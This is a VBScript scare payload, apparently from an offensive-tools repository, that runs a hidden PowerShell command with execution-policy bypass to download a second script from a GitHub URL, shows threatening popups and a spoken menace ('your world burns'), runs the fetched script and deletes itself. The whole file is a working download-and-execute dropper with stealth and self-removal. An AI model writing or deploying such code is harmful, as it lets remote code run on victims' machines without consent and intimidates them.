Option Explicit
Dim x7p9q, q3z8k, spVoice, r4t6y, path, voice
Set x7p9q = CreateObject("WScript.Shell")
Set q3z8k = CreateObject("Scripting.FileSystemObject")
Set spVoice = CreateObject("SAPI.SpVoice")

spVoice.Rate = -2 ' Slower, moaning horror
spVoice.Volume = 100 ' Max loudness
On Error Resume Next
For Each voice In spVoice.GetVoices
    If InStr(voice.GetDescription, "David") Then Set spVoice.Voice = voice
Next
On Error GoTo 0

path = x7p9q.ExpandEnvironmentStrings("%TEMP%") & "\riddle.vbs"
x7p9q.Run "powershell.exe -ep bypass -noP -w hidden ""iwr -uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/riddle.vbs' -outfile '"& path & "'""", 0, True

' x7p9q.Run "cmd.exe /c " & WScript.ScriptFullName, 0, False

x7p9q.Popup "You made a grave mistake. A pact with forces beyond this world.", 0, "WARNING", 16
WScript.Sleep 1800 + Rnd * 300 
x7p9q.Popup "Your soul was sold for power, but the price is now due.", 0, "THE RECKONING", 16
WScript.Sleep 1300 + Rnd * 200 
x7p9q.Popup "The darkness watches. Solve the riddle, or your world burns.", 0, "NO ESCAPE", 16
WScript.Sleep 1000 + Rnd * 1000 

spVoice.Speak "You thought you could cheat the abyss. You were wrong. Answer the riddle, or face eternal torment.", 1

x7p9q.Run "wscript.exe '" & path & "'", 0, True

x7p9q.Run "powershell remove-item -path '" & WScript.ScriptFullName & "' -Force -ErrorAction SilentlyContinue", 0, True